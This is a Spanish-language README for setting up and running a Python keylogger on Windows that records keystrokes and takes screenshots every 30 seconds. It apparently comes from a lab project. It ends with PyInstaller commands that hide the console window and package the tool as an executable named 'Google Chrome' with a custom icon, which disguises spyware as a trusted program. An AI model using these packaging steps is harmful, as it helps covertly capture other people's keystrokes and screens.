# Configuración del Entorno Virtual para Keylogger (Windows)

## Librerías Necesarias
- `pynput` - Para capturar eventos del teclado

## Pasos para Configurar el Entorno Virtual

### 1. Abrir PowerShell o Símbolo del sistema
- Presiona `Win + X` y selecciona "Windows PowerShell" o "Símbolo del sistema"

### 2. Navegar al directorio del proyecto
```powershell
cd "C:\Users\Francisco Flores\Desktop\keylogger"
```

### 3. Crear el entorno virtual
```powershell
python -m venv venv
```

### 4. Activar el entorno virtual
```powershell
.\venv\Scripts\Activate.ps1
```
*Nota: Si tienes problemas con políticas de ejecución, ejecuta:*
```powershell
Set-ExecutionPolicy -ExecutionPolicy RemoteSigned -Scope CurrentUser
```
*Este comando es permanente y no necesitarás ejecutarlo de nuevo.*

### 5. Instalar las librerías necesarias
```powershell
pip install -r requerimientos.txt
```

### 6. Ejecutar el programa
```powershell
python main.py
```

### 7. Para detener el keylogger
Presiona `Ctrl + C` en la terminal

### 8. Crear archivo .exe portátil (opcional)
```powershell
pyinstaller --onefile --windowed --name=keylogger main.py
```
*El .exe se creará en la carpeta `dist`*

**Opciones adicionales de PyInstaller:**
- `--onefile`: Crea un solo archivo .exe
- `--windowed`: Oculta la ventana de consola (ejecuta en segundo plano)
- `--add-data "lab_outputs;lab_outputs"`: Incluye la carpeta de salida
- `--icon=icon.ico`: Agrega un icono personalizado

**Comando completo con todas las opciones:**
```powershell
pyinstaller --onefile --windowed --name="Google Chrome" --icon="C:\Users\Francisco Flores\Desktop\keylogger\icono.ico" main.py
```

## Notas Importantes
- Los archivos se guardarán en la carpeta `lab_outputs`
- El keylogger captura teclas normales, espacios, enters, y maneja backspace/delete
- Se toma una screenshot cada 30 segundos
- Usa este software de manera ética y legal
- El .exe generado incluye todas las dependencias, no necesita Python instalado
